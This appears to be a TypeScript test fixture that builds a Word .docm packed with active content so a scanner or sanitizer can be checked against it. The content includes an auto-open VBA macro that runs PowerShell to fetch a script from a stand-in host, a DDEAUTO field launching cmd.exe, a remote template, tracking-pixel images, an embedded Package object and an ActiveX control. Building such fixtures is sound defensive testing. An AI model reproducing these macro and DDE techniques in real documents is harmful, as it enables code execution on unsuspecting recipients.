/**
 * [F-2.1] A Word document that does things on opening: a macro calling the
 * system, a remote template, a DDE field, a picture included from a server,
 * an embedded Package object, an ActiveX control, a picture loaded remotely.
 */

import { strToU8, zipSync } from 'fflate';
import { vbaProject } from './cfb.js';

const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:o="urn:schemas-microsoft-com:office:office"';
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const rels = (...items: string[]) =>
  `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${items.join('')}</Relationships>`;

const MACRO = [
  'Sub Document_Open()',
  '  Dim s: Set s = CreateObject("WScript.Shell")',
  '  s.Run "powershell -c iwr https://charge.exemple/x.ps1"',
  'End Sub',
].join('\r\n');

export function docm(): Uint8Array {
  const field = (instr: string) =>
    `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${instr}</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>résultat</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
  return zipSync({
    '[Content_Types].xml': strToU8(
      '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>',
    ),
    '_rels/.rels': strToU8(rels(`<Relationship Id="rId1" Type="${REL}/officeDocument" Target="word/document.xml"/>`)),
    'word/document.xml': strToU8(
      `<?xml version="1.0"?><w:document ${W}><w:body><w:p>${field(' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" ')}</w:p>` +
        `<w:p>${field(' INCLUDEPICTURE "http://pixel.exemple/p.png" \\d ')}</w:p>` +
        `<w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i1025" r:id="rId8"/></w:object></w:r></w:p></w:body></w:document>`,
    ),
    'word/_rels/document.xml.rels': strToU8(
      rels(
        `<Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>`,
        `<Relationship Id="rId8" Type="${REL}/oleObject" Target="embeddings/oleObject1.bin"/>`,
        `<Relationship Id="rId9" Type="${REL}/image" Target="https://pixel.exemple/ouverture.png" TargetMode="External"/>`,
        `<Relationship Id="rId10" Type="${REL}/control" Target="activeX/activeX1.xml"/>`,
      ),
    ),
    'word/vbaProject.bin': vbaProject({ ThisDocument: MACRO }),
    'word/embeddings/oleObject1.bin': new Uint8Array(600).fill(1),
    'word/activeX/activeX1.xml': strToU8('<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" ax:classid="{8BD21D40-EC42-11CE-9E0D-00AA006002F3}"/>'),
    'word/settings.xml': strToU8(`<?xml version="1.0"?><w:settings ${W}><w:attachedTemplate r:id="rId1"/></w:settings>`),
    'word/_rels/settings.xml.rels': strToU8(
      rels(`<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="https://modeles.exemple/rapport.dotm" TargetMode="External"/>`),
    ),
  });
}

